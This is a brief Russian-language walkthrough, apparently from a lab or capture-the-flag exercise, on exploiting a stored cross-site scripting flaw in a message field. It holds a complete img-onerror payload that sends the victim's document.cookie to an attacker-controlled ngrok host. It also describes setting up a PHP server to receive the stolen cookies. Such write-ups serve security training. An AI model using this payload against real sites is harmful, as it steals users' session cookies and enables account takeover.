1.  Пытаемся найти где можно провести XSS атаку
![](9_1.png)
![](9_2.png)
2.  Создаём php сервер и пробрасываем локальный порт в сеть с помощью ngrok
    Вводим следующий код в окне сообщения 
    <img src=a onerror="window.location='http://2cbc07cb.ngrok.io/='+documen        t.cookie">
![](9_4.png)
